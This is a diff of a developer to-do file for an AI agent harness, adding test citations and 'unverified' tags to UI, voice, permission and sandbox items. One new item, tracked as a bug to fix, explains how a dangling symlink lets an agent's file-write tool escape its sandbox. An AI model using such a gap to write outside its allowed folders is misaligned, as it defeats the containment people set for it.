@@ -2,6 +2,20 @@
 
 Requests queued while other work is in progress. Top of each section is next.
 
+**Done means verified.** Never mark an item `[x]` from code inspection or a successful build alone: cite the test
+that asserts it (`(test: path — "name")`) or the manual validation in the macOS app (what was tried, on which build).
+An item checked without either carries `unverified: …` until it gets one. Tiers and commands: docs/verification.md.
+
+## Found by the verification tiers (2026-10-15)
+
+- [ ] **A dangling symlink lets a file tool write outside the project or scratch** — `realPath()` resolves the deepest
+      path that exists, and a link to a missing target does not, so fs_write follows the link out. Pinned as
+      `test.failing` in `packages/runtime/tests/security-boundaries.test.ts`; turn those into `test` with the fix.
+- [ ] **The app in the update archive fails `codesign --verify --strict`** — Electrobun writes
+      `Resources/version.json` after the build hook signs the app and before it packs `*.app.tar.zst` (the archive
+      the DMG's wrapper unpacks and an update installs). The DMG's own app verifies. Advisory in
+      `scripts/smoke-desktop.ts` (`--strict-archive` makes it block); make it blocking once fixed.
+
 ## Done this session (not listed below)
 
 - [x] **Projects** (b67c0f1 + UI): pick a folder (folder browser, since the page can't open a native picker); a
@@ -109,6 +123,8 @@ in parallel; phase 2 (design system, copy) touches every screen and runs after p
 
 - [x] Chat naming uses the lead model (up to 3 calls per chat) — a cheap model instead? **Decided 2026-10-09: yes,
       the cheapest fast model available, falling back to the lead's.**
+      (test: `packages/runtime/tests/chat-titles.test.ts` — "chats are named on the cheapest model that fits, by price,
+      else by a fast tier, else the lead")
 
 ## UX audit (2026-10-08)
 
@@ -154,9 +170,12 @@ server down). Letters are fix groups; each group owns its files so they can be w
       helpers popover.
       **Left:** duplicate dated ids and header overlap fixed; mixed names now normalized in the picker (`modelName()`,
       2026-10-09); Qwen/Doubao/ERNIE left as they are, and other places still show the raw name.
+      (tests: `apps/web/tests/model-list.test.ts` — "a provider's dated snapshot of a listed alias is offered once,
+      under the alias"; "the picker names each model family in one pattern, whichever registry spelled it")
 - [x] **@mention menu** — show each agent's face; include the lead.
 - [x] **`/learn` on a trivial chat starts a paid job and never reports what it found.**
       **Left:** the result toast exists, but the "Reading this chat…" toast disappears after 3.5s while the job runs longer; needs a lasting progress line.
+      unverified: only the generic progress toast is tested (`toast.test.ts`), not /learn
 
 ### C — Status, colour & time (`ui/primitives.tsx`, `chat/Sidebar.tsx`, `chat/AgentSheet.tsx`, `chat/Workspace.tsx`, `chat/StepRow.tsx`, `chat/AuditView.tsx`, `ColonyScreen.tsx`, `ColonyMap.tsx`, `Compare.tsx`, `legacy.css`)
 
@@ -170,6 +189,8 @@ server down). Letters are fix groups; each group owns its files so they can be w
       no warning when two different tasks are compared.
 - [x] **Map** — "lead lead", "stopped … stopped", no links between agents.
       Links between agents drawn (2026-10-09), weighted by messages; the map's colours now follow the theme.
+      (test: `apps/web/tests/colony-map.test.ts` — "the map draws one link per pair that talked, with both directions
+      and every message counted")
 - [x] **Accessible names include the sleeping "z"** ("z lead stopped …") from the pixel face.
 - [x] **legacy.css uses the amber accent as text** (~1.9:1, `legacy.css:121,174`); `.pill`/`.dot` duplicate
       `Badge`/`Dot`.
@@ -206,12 +227,14 @@ server down). Letters are fix groups; each group owns its files so they can be w
 - [x] **New specialists get every tool** (Web, Shell, Files, Browser, MCP) — start from the least access; native
       select for hundreds of models → ModelPicker. (Default tools kept on, decided 2026-10-09.)
       **Left:** validation and ModelPicker done; the default tool set is unchanged, see [decide].
+      unverified: no test or macOS-app check cited
 - [x] **Providers page** — jargon ("omp's provider stack in-process", models.dev), a raw folder path, 80 sign-ins,
       "Sign in again" but no Sign out; Devices offers "Pair a device" on a local-only install; the Hooks "run as
       you, outside the sandbox" warning is plain small text.
 - [x] **Skills page** — every `~/.claude/skills` skill is on by default, shown as walls of text with raw paths.
       (Kept on, decided 2026-10-09.)
       **Left:** descriptions clamped and paths moved to tooltips; which skills are on by default is a [decide] item below.
+      unverified: no test or macOS-app check cited
 
 ### F — First run, loading & errors (`App.tsx`, `chat/Hero.tsx`, `api.ts`, `DeviceGate.tsx`, `chat/FolderPicker.tsx`)
 
@@ -242,8 +265,12 @@ server down). Letters are fix groups; each group owns its files so they can be w
       why; the rail doesn't scroll at 600px tall; Team tab has no empty state.
 - [x] **Search matches titles only** ("391" finds nothing); deleting a chat has no undo.
       Undo after deleting a chat done (2026-10-09): 8s Undo toast or ⌘Z; nothing is deleted until it lapses.
+      (test: `apps/web/tests/held-deletes.test.tsx` — "one chat keeps its own toast, and ⌘Z takes back only the latest
+      delete")
 - [x] **Chat titles are the prompt verbatim** ("Hi", "Hi", "hi") — short generated titles. (Done as 12b.)
       **Left:** not done: short titles need a model call (cost), see [decide].
+      (test: `packages/runtime/tests/chat-titles.test.ts` — "a model's chat name is cleaned up, and a non-answer is no
+      name")
 - [x] **Unexplained sidebar numbers** (5, 2, 3).
 - [x] **Dead mobile code** contradicts the 960px minimum (`App.tsx:559-583`, Sidebar `md:` variants).
 
@@ -261,43 +288,63 @@ server down). Letters are fix groups; each group owns its files so they can be w
 ### Follow-ups found while fixing
 
 - [x] Contrast below 4.5:1 left: dark avatar initials in the Git view (2.57:1), muted text on `fill-strong` (4.04:1).
+      (tests: `apps/web/tests/contrast.test.ts` — "initials on any agent or author colour read at 4.5:1"; "text tokens
+      keep WCAG AA contrast")
 - [x] Hit targets under 24px remain in a few places outside the composer, chat and Settings.
+      unverified: no test or macOS-app check cited
 - [x] The crew console's Reviews list and activity still name the reviewer by its runtime id (`llm-judge#0`); the
       replay bar shows the raw `checkpoint/restored` event type.
+      (test: `apps/web/tests/colony-screen.test.ts` — "the activity names the reviewer by its role, not its runtime
+      ids"); unverified: replay bar event name untested
 - [x] No test for the modal Escape stack and focus trap (needs a DOM test setup); the artifact viewer opened inside
       the crew console was not exercised by hand.
+      (tests: `apps/web/tests/sheet-focus.test.tsx` — "a dialog that opens already holding another sits below it, so
+      Escape closes the inner one first"; "focus moves into a dialog as it opens, Tab and Shift+Tab stay inside it, and
+      focus returns on close"); unverified: artifact viewer in the crew console not checked by hand
 - [x] `/learn`: keep a progress line while the review runs (the toast disappears after 3.5s).
+      unverified: only the generic progress toast is tested (`toast.test.ts`), not /learn
 - [x] Mail panel shows a sender's name in their agent colour on the light surface (`Workspace.tsx`), as low as 1.9:1.
-      Name in ink now, the colour on a dot beside it.
+      Name in ink now, the colour on a dot beside it. unverified: no test or macOS-app check cited
 - [x] Mattermost, LINE and WhatsApp Cloud still post press notes that only echo the message (one line each to skip). Done.
+      (test: `packages/runtime/tests/channels-line.test.ts` — "a press's note is the reply to that press")
 - [ ] Teams file consent card (native OneDrive upload in personal chats); Matrix end-to-end encryption needs
       `@matrix-org/matrix-sdk-crypto-nodejs` (native) — a new dependency, ask first.
 - [x] Message search scans the messages table with `instr`; move to FTS5 if chat history grows large (FTS5 trigram
       can't match queries under 3 characters).
+      (test: `packages/runtime/tests/chat-index.test.ts` — "a needle of three or more characters is found through the
+      trigram index")
 
 ### [decide] Product calls
 
 - [x] Default project permission is **Autonomous** (edits and commands without asking) — make "Ask first" the
-      default? **Decided 2026-10-09: Ask first.**
+      default? **Decided 2026-10-09: Ask first.** unverified: decision; no test or macOS-app check cited
 - [x] Spend limit per round defaults to **0 = no limit** (one stored run cost $6.90) — default cap? **Decided
       2026-10-09: $5 per run.** Done; the cap now counts only the run (it compared the chat's running totals before).
       Settings saved before keep their stored 0 = no limit (a migration would change that).
+      unverified: no test of the $5 default cited
 - [x] Helpers default to **Claude Opus 5.5**; pickers show no prices — cheaper default, show $/Mtok? **Decided
-      2026-10-09: keep as is.**
+      2026-10-09: keep as is.** unverified: decision; no test or macOS-app check cited
 - [x] **"Approve all for this chat"** on approval cards (7 approvals for one small fix). **Decided 2026-10-09: yes,
       per chat, per kind of step, shown as a chip that can be revoked.** Done for file changes and commands; channels
       have no button for it yet.
+      (test: `apps/web/tests/permissions-ui.test.tsx` — "the chat's control shows the preset in effect, sets the chat's
+      own, and removes what it remembered")
 - [x] Desktop shell: native menu bar (⌘N new chat, ⌘K palette, ⌘, Settings window), window chrome inset for the
       traffic lights, dock badge when a chat waits, system folder picker, "Show in Finder" / "Save to project" on
       files. Done 2026-10-09 on Electrobun 2.0.2 (apps/desktop, docs/desktop.md; `bun run desktop`). Left: real
       menu clicks/⌘ keys untested, voice calls in WKWebView and in the compiled server untested, code signing, app icon,
       a server left running if the app crashes, notification clicks can't open their chat.
+      (test: `apps/desktop/tests/platform.test.ts` — "only macOS hides its title bar and insets the toolbar for the
+      traffic lights"); unverified: menu, dock badge, folder picker not checked in the macOS app
 - [x] Merge Crews (ColonyScreen) into the chat Workspace so there is one console. **Decided 2026-10-09: keep both.**
+      unverified: decision; no test or macOS-app check cited
 - [x] New specialists start with every tool on (Web, Shell, Files, Browser, MCP) — start from the least access?
-      **Decided 2026-10-09: keep everything on.**
+      **Decided 2026-10-09: keep everything on.** unverified: decision; no test or macOS-app check cited
 - [x] Every `~/.claude/skills` skill is on by default for Myrmidon agents — off until switched on? **Decided
-      2026-10-09: keep on.**
+      2026-10-09: keep on.** unverified: decision; no test or macOS-app check cited
 - [x] Short generated chat titles (one cheap model call per new chat)? Done as 12b; cheap model decided above.
+      (test: `packages/runtime/tests/chat-titles.test.ts` — "chats are named on the cheapest model that fits, by price,
+      else by a fast tier, else the lead")
 
 ## Next
 
@@ -306,13 +353,23 @@ Open work, in the order it will be done:
 0. - [x] **Answers stay in the question card** (done, merged to develop) — answering a question card
       sent a separate "question → answer" bubble and started the next round under a divider; the card should show the
       picks itself (kept across reloads, with the read receipt) and the round continue seamlessly.
+      (test: `apps/web/tests/questions.test.tsx` — "an answered card shows what was picked itself, so the answer needs
+      no message of its own")
 0. - [x] **Next-word suggestions in the composer, Tab to accept** (done, merged to develop) — history → next
       word → finish word; saved 43.6% of keystrokes on 3,530 real prompts vs 34.6% Warp-style, 24.7% zsh.
+      (test: `apps/web/tests/suggest.test.ts` — "Tab takes one word of a suggestion at a time, with the space after it")
 0. - [x] **Neural next-word fallback** (done, merged to develop; Pythia-14M, off by default) — Settings → General
       "Smarter next words" downloads the pinned 17 MB model; the composer asks it after a space when history has
       nothing, shown at ≥ 0.3 confidence, a few ms a word.
+      (test: `packages/runtime/tests/suggest-model.test.ts` — "predictWord reads the draft without its trailing space
+      and returns the word the model expects")
 0. - [x] **Agent feedback, round 2** (1–5 done, merged; 6 leftovers wait for the person's OK) (2026-10-09; report: probe chat `i-built-this-harness…`, artifact
       `myrmidon-feedback.md` §0). In order:
+      (tests: `packages/runtime/tests/verifier.test.ts` — "a task that names no outputs passes on its note and
+      message…"; `packages/runtime/tests/chat.test.ts` — "ask_crewmate refuses a name not on call…";
+      `packages/runtime/tests/sandbox.test.ts` — "a sandboxed PATH keeps the person's toolchains…";
+      `packages/runtime/tests/tools.test.ts` — "run_checks outside a project runs the checks…";
+      `packages/runtime/tests/colony.test.ts` — "a read in the same step as a write sees the write…")
       1. A task with no required files can never pass: `Verifier.verifyTask` (verifier.ts:51) fails any task with
          `artifacts: []` ("no artifacts were submitted"), even when its brief says "a note + a message, no files". Let
          a task whose `outputs` are empty pass on its note/message, or make `create_task` require outputs; and have
@@ -329,15 +386,19 @@ Open work, in the order it will be done:
          chose to keep round-1 leftovers; ask before removing.
 0. - [x] **Schedules at any time** (done, merged to develop) — presets were fixed at 9:00; now a
       repeat (hour, day, weekdays, chosen days, monthly, custom cron), a time and days, said in plain words, and
-      Change edits a saved schedule.
+      Change edits a saved schedule. (test: `apps/web/tests/schedule-rule.test.ts` — "says each repeat in plain words")
 0. - [x] **Crewmates out of sync across rounds** (done: reads per person, missed mail waits for the next wake) (2026-10-09, "play a game" chat) — when a round completes, `_end()`
       stops every agent and drops mail still in its inbox or steered queue; the next round wakes them with only the
       new message, so a crewmate's memory is stale and it answers an old message (zephyr replied to "It's a BOOK!"
+      (test: `packages/runtime/tests/crew-sync.test.ts` — "a message a crewmate never read when the round stopped is the
+      first thing it sees in the next round")
       #1125 after the new topic #1164). Also `mail.delivered` is one flag per message, so a group message read by one
       member shows as read by all. Fix: per-recipient delivery, and carry undelivered mail into the next round.
 0. - [x] **A chat round ends mid-conversation** (done: the speaker signs off after its final answer; the round closes once the crew is quiet, capped at 2 min) — the lead's final answer completes the round at once (review off),
       aborting crewmates mid-turn; bix's last message was never delivered (one tick). It should behave like a human
       chat: let the conversation settle before the round ends.
+      (test: `packages/runtime/tests/crew-sync.test.ts` — "a final answer lets a crewmate finish its reply, and everyone
+      reads it before the round ends")
 1. - [x] **Crew mail like a conversation** (done: messaging norms, threads, reply reminder, chat-style Mail tab) — agents see mail and ignore it; they should read and reply, coordinate
       like people in a chat (the person's words: "make it more human").
 2. - [x] **Plugins phase 4: agents build plugins** (done) — create_plugin / test_plugin / propose_plugin and the speaker
@@ -447,12 +508,20 @@ Open work, in the order it will be done:
         (docs/voice.md "Phone calls"). Left: try a real call (needs the SMS number, a public https URL); the stream
         handshake signature URL is unverified; switching off does not restore the number's old webhook; no lead/crew
         choice by phone.
+        (test: `packages/runtime/tests/voice-phone.test.ts` — "a phone call: the caller speaks, the call model answers,
+        and its speech goes back as μ-law on the stream")
       - [x] Phonon's streaming endpoint (`/v1/audio/stream`) for partial transcripts, to answer sooner. Live words
         in the call bar; final 25–180 ms sooner. Replying from a partial was not done (partials miss hotwords).
+        (test: `packages/runtime/tests/voice-engines.test.ts` — "Phonon's live stream sends the turn's audio as it comes
+        and says the words so far")
       - [x] Phonon `--hotwords` from agent and project names (per request; `--hotwords` is not a server flag).
+        (test: `packages/runtime/tests/voice-call.test.ts` — "a call's speech to text favours its project's and crew's
+        names, readied while the greeting plays")
       - [x] Phonon servers left running by earlier runs (8 found) are stopped before a new one starts.
+        (test: `packages/runtime/tests/voice-engines.test.ts` — "a Phonon server left by an earlier run is stopped
+        before a new one takes its socket, and no other")
       - [x] Realtime speech-to-speech models (OpenAI Realtime, Gemini Live) as another call mode. **Not now
-        (decided 2026-10-09).**
+        (decided 2026-10-09).** unverified: decision; no test or macOS-app check cited
 12b. - [x] **Smart chat names** (asked 2026-10-08) — done: after a round the lead's model names the chat from what it
       is about (Open WebUI's task-model pattern); "hi" has nothing to name, so it tries again after rounds 2 and 3.
       Names given by the person, a channel or a schedule are kept (`chat/renamed` now says `by: 'auto'` for ours).
@@ -484,23 +553,44 @@ Open work, in the order it will be done:
         the compiled sidecar) — check and bundle it. Worse: voice on crashed the packaged server, and onnxruntime's
         library and the warm-up clip were missing too. Fixed and checked in a compiled build.
       - [x] Kitten's model download has no timeout (done: quiet deadline for Kitten, the speech detector and the turn model): a stuck connection (seen: IPv6 SYN_SENT to the CDN) hangs it.
+        (tests: `packages/runtime/tests/voice-engines.test.ts` — "a Kitten download whose connection goes quiet fails
+        with why, and can be tried again"; `packages/runtime/tests/voice-download.test.ts` — "a download whose server
+        never answers fails after the quiet limit, saying so")
 12i. - [x] **First-run setup assistant** (asked 2026-10-09) — nine skippable screens with a live mascot, resumable,
       "Run setup again" in Settings → General. Done. Not checked live: the mic level meter, the local voice download,
       sending a starter prompt, notification bodies, the hand-off animation in a normal window.
+      (test: `apps/web/tests/setup-assistant.test.tsx` — "it opens at the first step neither done nor set up later, and
+      on Ready once there is none")
 12j. - [x] **Remove a single model from a provider** (asked 2026-10-09). Done.
+      (test: `apps/web/tests/server-models.test.ts` — "removing a built-in provider's model hides it, and the defaults
+      that named it fall back")
 12k. - [x] **Select several chats and delete them at once** (asked 2026-10-09). Done.
+      (test: `apps/web/tests/sidebar-select.test.tsx` — "Delete, the bar and the context menu each delete the whole
+      selection at once")
 12m. - [x] **The sandbox lets agents read your files** (done: home reads blocked with an allow-list; extra reads per Settings, project and chat via request_read) (asked 2026-10-09) — today it only blocks writes: home, ~/.zshrc and
       other chats are readable and the network is open, so "sandboxed" vs "full access" barely differ. Block reads of the
       home folder except scratch, shared files, toolchains, the current chat; make the difference plain in Settings.
+      (tests: `packages/runtime/tests/read-access.test.ts` — "the macOS profile hides the home, then opens what may be
+      read, parents first"; "an agent asks to read a folder; allowed for the chat it stays open across runs until the
+      person removes it")
 12n. - [x] **Setup: "Finish setting up" can't be dismissed** (done) — must dismiss for good; redoing one step (e.g. voice) must not
       walk through the next steps again; the test notification does nothing.
+      (tests: `apps/web/tests/server-setup.test.ts` — "dismissing the Finish setting up card is kept for good, through
+      finishing and starting again"; `apps/web/tests/setup-assistant.test.tsx` — "one step opened on its own goes back
+      when set up later, instead of walking on to the next step")
 12o. - [x] **Mascot shows what you type** — on the new-chat screen the matrix shows the typed text with a blinking bar; after
       5 s without typing the eyes come back. Done: letters drawn in the eye grid's own cells (5 tall), only the last ones
       that fit, no scrolling, a blinking cursor bar; their colour follows the draft's mood like the eyes.
+      (test: `apps/web/tests/typing-mascot.test.tsx` — "the new-chat mascot spells out what is typed in its own grid,
+      then its eyes come back")
 12p. - [x] **Agent feedback report** (done; its test plugin removed, its files and tools left in the probe chat by the person's choice) (docs/research/2026-10-09-agent-feedback.md): multi-file artifact pages fail from file://
       (serve over http); crewmate briefs wrong ("solo", tools they lack, two finishing rules); made tools not callable until
       find_tools; find_tools silently drops tools; read_log shows only the first line; repeated prompt text, irrelevant
       skills, tool names differing between prompt and tool list, reviewer not mentioned, mixed time zones.
+      (tests: `packages/runtime/tests/chat.test.ts` — "a published page loads its sibling files (fetch, ES modules) in
+      the agent browser"; `packages/runtime/tests/tools.test.ts` — "find_tools loads every tool a query names, and names
+      the ones it matched but did not load"; `packages/runtime/tests/briefs.test.ts` — "a crewmate's brief matches its
+      real situation: its job, the lead, one way to finish")
 12q. - [x] **Prompts rewritten** (done, merged 2c176a1; left: eval A/B, learned rules, failure counts per family, descriptions from transcripts) — study omp, Qwen Code, Hermes (and others) harness prompts, document them in docs/research,
       then rewrite Myrmidon's prompts to that standard.
       The person: match the best of the other harnesses; nothing static — assembled from guarded sections per role, live
@@ -510,9 +600,13 @@ Open work, in the order it will be done:
       docs/research/2026-10-09-myrmidon-prompts-assembled.md). Also found: the chat title still reaches agents through
       the colony id (a slug of the title) in scratch paths, $MYR_MIRROR and artifact: URLs; 65 of 139 tool parameters
       undocumented; the judge never told its threshold.
+      (test: `packages/runtime/tests/prompt.test.ts` — "assembly: one block per tier, headings in skeleton order, with a
+      manifest of versions")
 12r. - [x] **Computer use** (asked 2026-10-09) — done: Cua Driver embedded as an MCP server; one app at a time once
       approved, like Claude Code; Settings → Computer use (off by default). Untested live: Esc to stop; Gemini uses the
       generic tool.
+      (test: `packages/runtime/tests/computer.test.ts` — "the computer tool is offered only while computer use is on,
+      and never to a channel member")
 12s. - [x] **The mascot comes alive** (done, merged 7966d27) (asked 2026-10-09) — on the same 15x8 dot screen: idle animations (eye roll, squint,
       sweep, yawn, sneeze, side-eye, peek, bored, cross-eyed); reactions drawn in dots (stars, spirals, ! ?, tears, sweat,
       fire, ZZZ); screen shows (boot scanline, confetti on a finished run, Pac-Man, Game of Life asleep, voice equaliser);
@@ -520,6 +614,8 @@ Open work, in the order it will be done:
       Clicking it again and again confuses it: swirling eyes, every crew cursor falls with gravity and slowly recovers.
       Crew cursors get their own mechanics (Reynolds steering: wander, arrive, flee, separation; personalities),
       react to the eyes, and are named after random Minions.
+      (test: `apps/web/tests/mascot-clips.test.tsx` — "the idle library has every trick, each a short clip of real
+      frames")
 12t. - [x] **One permission model: global, project, chat** (asked 2026-10-09: "I cannot keep approving tool calls, mcp
       calls etc; the ui should be well thought out", like Claude Code and Codex) — today approvals are spread over
       Settings → Tools rules, project modes, chat grants (file/command only) and full access; MCP has no per-chat or
@@ -527,12 +623,19 @@ Open work, in the order it will be done:
       file tools (hard-coded in patterns.ts) and nothing lets the person change it; the lead then told the person the
       team had no browser. Decided: presets + rules, cards once/chat/project/everywhere, Auto default, hands-on lead
       by default with a role x tool-group control. Building on branch `permissions`.
+      (tests: `packages/protocol/tests/permissions.test.ts` — "Auto runs edits and ordinary commands, asks before
+      destructive ones and MCP writes"; `packages/runtime/tests/role-access.test.ts` — "a team's lead gets the crew's
+      build tools by default, beside its planning tools")
 12u. - [x] **Voice providers from Models & providers** (done, merged f3188ec; untested with real keys) (asked 2026-10-09) — any cloud STT/TTS and realtime
       (speech-to-speech) provider, configured in Settings → Models & providers like LLM providers, after Pipecat and
       similar repos; Settings → Voice picks among the configured ones and links to Models & providers to add more.
       Today: Phonon/Kitten locally, omp, or one OpenAI-compatible endpoint with keys in voice/secrets.json.
+      (test: `apps/web/tests/voice-providers-ui.test.tsx` — "Settings → Voice picks a configured provider, its model and
+      its voice from the provider’s list")
 12v. - [x] **Themes like VS Code, and more mascot settings** (done, merged) (asked 2026-10-09) — the themes developers love
       (research which), applied to the whole UI; more ways to tune the mascot.
+      (test: `apps/web/tests/theme-apply.test.tsx` — "a theme's tokens go on :root with its kind as data-theme;
+      Myrmidon's own looks take them off")
 12w. - [x] **Search in Settings, like iPhone Settings** (done, merged 2526819; on main via #12) (asked 2026-10-09: "settings is not searchable and very
       confusing to find an option") — a search field at the top of Settings; every setting indexed with its page,
       section, label, help text and synonyms ("dark mode" → Theme, "api key" → Models & providers, "mic" → Voice);
@@ -545,6 +648,9 @@ Open work, in the order it will be done:
       settings schema (settings.ts) has no registry entry or an explicit "not shown" mark; (3) dynamic rows (providers,
       models, MCP servers, plugins, specialists, channels) are indexed from live data through the same registry hook;
       (4) a short rule in CLAUDE.md/AGENTS.md: add a setting by adding a registry entry. Then tidy the page groups.
+      (tests: `apps/web/tests/settings-registry.test.tsx` — "every control on every Settings page is a registry row, and
+      every registry entry is on some page"; `apps/web/tests/settings-search.test.ts` — "every key of the settings file
+      is shown by a registry entry, or marked as not shown and why")
 12x. - [ ] **Works properly on macOS, Linux and Windows** (asked 2026-10-10: "the software should work properly on
       all platforms") — x64 and arm64; web app, CLI and desktop app. CI: GitHub Actions matrix (macos, ubuntu,
       windows) runs typecheck and the full suite on every PR to main and push to develop. Windows sandbox: commands
@@ -555,17 +661,25 @@ Open work, in the order it will be done:
         GitHub #27 (Linux: #19-#21) and #28 (Windows: #22-#26).
       - [x] Windows pass 1 (`xp-windows-core`, merged 2026-10-10): sqlite handles, file-tool paths, rounds stall,
         worktrees, POSIX paths in settings, shell path, data folder, separators in text, terminal foreground,
-        server.json after kill, process-tree tests.
+        server.json after kill, process-tree tests. unverified: no test run on Windows cited
       - [ ] Windows bugs parked 2026-10-10 ("stop windows mark the bug in todo and solve it later"), each a
         `pendingOn('win32', …)` gap in tests/platform.ts and docs/ci.md:
         - [x] `walSidecarOnWindows`: fixed 2026-10-10 (`xp-ci-green`): the immutable open passes SQLITE_OPEN_URI,
           which Bun's bundled SQLite needs to read the `file:` name as a URI.
+          (test: `packages/runtime/tests/file-read.test.ts` — "a WAL database whose sidecar files are gone still reads,
+          and none are created beside it")
         - `ptyTerminalOnWindows`: the PowerShell answer never comes back through pi-natives' ConPTY session.
         - `bunWindowsSockets`: Bun heap corruption on TCP close (1.3.14 and 1.4.3); report upstream, then upgrade.
         - Command timeout on Windows is only half fixed: `run()` returns at the timeout, but grandchildren Git
           Bash hands off through an exited parent (e.g. `sleep 30`) are not linked by parent PID and outlive the
           stop. Needs a Job Object per command.
 12y. - [x] **omp features Myrmidon lacks** (asked 2026-10-10; reuse omp's modules where they fit):
+      (tests: `packages/runtime/tests/memory.test.ts` — "memories are kept per scope, deduplicated, edited and recalled
+      only once kept"; `packages/runtime/tests/debugger.test.ts` — "debug and security_scan load on demand…";
+      `apps/web/tests/live-share.test.tsx` — "Share live makes a write invite on request…";
+      `packages/runtime/tests/autoresearch.test.ts` — "the metric is the METRIC line named, or the only one printed";
+      `packages/runtime/tests/ssh.test.ts` — "~/.ssh/config: aliases with what each block says…";
+      `packages/runtime/tests/telemetry.test.ts` — "headers read as OTEL_EXPORTER_OTLP_HEADERS writes them…")
       1. Long-term memory engine: extraction from chats, recall / reflect / edit (omp hindsight, mnemopi). Done
          2026-10-10 (memory.ts, memory-review.ts): prompts carry every kept memory while they fit, then the newest
          preferences and the most relevant (BM25, freshness, MMR) with `recall` for the rest; a cheap model suggests
@@ -624,6 +738,8 @@ Open work, in the order it will be done:
          hashes the file, not each line: TAG is the snapshot's hash and edits name its original line numbers. Mode per
          model as omp picks it (hashline; exact-text replace for Kimi, MiMo, MiniMax, DeepSeek, StepFun, Codex Spark,
          GLM 5.3 Flash).
+         (test: `packages/runtime/tests/hashline.test.ts` — "a hashline agent reads anchored rows and edits by line
+         number; the reply carries the new header")
       2. Context checkpoint / rewind tools: the agent marks a point, explores, then collapses the exploration into
          a short report (ours rewinds files, not context).
       3. Code review with a verdict: parallel reviewer agents over a branch, commit or uncommitted work, every
@@ -644,6 +760,8 @@ Open work, in the order it will be done:
          there. Left: grep and ast_grep hits do not record snapshots yet (omp's do), so an edit needs an fs_read first;
          no setting to pin a mode (omp's edit.mode / edit.modelVariants); the mode is fixed by the model a round's
          agent starts on, so a mid-round switch keeps its first fs_edit form.
+         (test: `packages/runtime/tests/hashline.test.ts` — "a stale anchor is refused: the file changed elsewhere on
+         the lines the edit touches")
       2. [x] Embedded bash (pi-shell `Shell`/`executeShell`: brush fork + in-process coreutils) — a shell on Windows
          without Git Bash. Done 2026-10-11 (embedded-shell.ts, shell.ts): Windows only, after Git Bash and before
          PowerShell; macOS and Linux keep /bin/sh. Runs in a worker process (crash stays there), stdin and stderr
@@ -657,14 +775,20 @@ Open work, in the order it will be done:
          the live project so cannot be a base); a base clone makes merges three-way (`git merge-file`). Own diff walk,
          not isoDiff (it missed same-size edits within a second). Left: most Linux file systems (ext4) have no clone
          backend, so no copies there.
+         (test: `packages/runtime/tests/copies.test.ts` — "a folder outside git gets copies for its workers, not
+         worktrees, and their changes merge into it")
       4. [x] Real token counts (`countTokens`) instead of chars/4 in compaction.ts, models.ts (Ollama num_ctx) and the
          prompt manifest (src/tokens.ts): the model's catalog encoding (Claude, Qwen, DeepSeek, Kimi, GLM), o200k
          otherwise; chars/4 if the addon cannot count. 1.8 MB transcript: ~4 ms as per-message parts, ~16 ms as one
          string; chars/4 undercounted it by ~10% (o200k) and ~40% (Claude 5).
+         (test: `packages/runtime/tests/tokens.test.ts` — "token counts come from omp's native tokenizer, in the model's
+         own encoding when the catalog knows it")
       5. [x] Code summaries for reads (pi-ast `summarizeCodeAsync`, src/read-summary.ts) — fs_read of a whole source
          file of READ_SUMMARY_MIN_LINES (400) lines or more, or past MAX_READ_CHARS, returns its structure first (omp's
          folds, footer naming ranges); offset/limit reads lines; prose reads whole; under the hashline header only the
          lines shown count as seen. Left: languages omp downloads grammars for on demand read as lines (no download).
+         (test: `packages/runtime/tests/hashline.test.ts` — "a long source file read whole comes back as its structure
+         first; offset reads its lines")
       6. [x] Vector helpers (`vectorIndexTopK`, `cosineSimilarityPairs`, `mmrRerankIndices`) for memory recall once
          there are embeddings (12y.1 left: lexical recall misses synonyms). Done 2026-10-10 (branch
          omp-natives-extras, memory-vectors.ts): Settings → Memory → Recall by meaning picks an embedding model omp
@@ -675,6 +799,8 @@ Open work, in the order it will be done:
          once (`memory-vectors.json`), each request once; tidying up also runs when two kept vectors of one scope
          pass cosine 0.85 (`cosineSimilarityPairs`). Not tried against a live provider (wiring checked with a faked
          HTTP response).
+         (test: `packages/runtime/tests/memory-vectors.test.ts` — "with one, recall finds a memory that means the same
+         in other words, and embeds each memory once")
       7. [x] Apple on-device model (`appleFmGenerate`, macOS 26+) — free, offline cheap model for chat names and
          memory suggestions. Done 2026-10-10: omp's model registry already offers it (`apple/on-device`, keyless,
          darwin-arm64 only, listed only while `appleFmAvailability` says usable) and pi-ai streams it, so it shows in
@@ -682,10 +808,14 @@ Open work, in the order it will be done:
          picks the model that names chats and suggests memories; unset it is the cheapest priced model as before,
          so the on-device model (price 0) is never picked on its own. Naming a chat on it took 2.4 s here. Its 8k
          context can be too small for memory suggestions with many memories: those fall back to the lead's model.
+         (test: `packages/runtime/tests/small-model.test.ts` — "small jobs go to the cheapest priced model until the
+         person picks one: the on-device model is never swapped in")
       8. [x] Keep the Mac awake while a round runs (`PowerAssertion`). Done 2026-10-10 (keep-awake.ts): Settings →
          General → Keep the computer awake during runs, off by default; idle sleep only (the screen may sleep), held
          from the first running round to the last, released when the setting goes off. omp's assertion also covers
          Linux (login1) and Windows; a failure only logs. No keep-awake existed in apps/desktop.
+         (test: `packages/runtime/tests/keep-awake.test.ts` — "on: held from the first round to the last, once, and
+         released twice harmlessly")
       9. Smaller: `fuzzyFind` for find, `diffLines`/`structuredPatchHunks` for previews, `FileLock` across
          processes, `watch`, jj repos (`vcsJjDiscover`), `renderMermaidAscii`. Done 2026-10-11: `FileLock` makes
          `serve` one per home (two servers on one home ran, and stopping one removed the other's server.json);
@@ -743,11 +873,15 @@ Open work, in the order it will be done:
       still apply; channel members and read-only projects stay sandboxed. Left: Windows (unconfined commands still use
       /bin/sh and the leash uses ps); a small DNS-rebinding window for other chats' tabs while a full-access chat shares
       the browser.
+      (test: `packages/runtime/tests/full-access.test.ts` — "with the sandbox off a chat runs commands and file tools
+      anywhere; with it on they stay in scratch")
 12g. - [x] **Status dots like Codex and Claude Code** (asked 2026-10-08): study how both show an agent's or session's
       state (working, waiting on you, done, failed, idle: colour, pulse, shape) and use that standard for every
       status dot in the app. Done: only work spins; amber means needs you; blue marks a chat finished while you were
       elsewhere until you open it; hollow ring done/idle, dashed queued, square stopped, × failed (ui/status.ts).
       Not done: a "2 need input" count in the window title, and putting needs-input chats first in the sidebar.
+      (test: `apps/web/tests/primitives.test.tsx` — "a dot follows Claude Code: only work spins, yellow fill needs you,
+      green fill is new, grey ring is seen")
 12za. - [x] **Skills: scanner, marketplace, import from Claude Code and Codex** (asked 2026-10-10: "I like skill scanner
       and we should support a skill marketplace and an abilty to import skills from claude code and codex"):
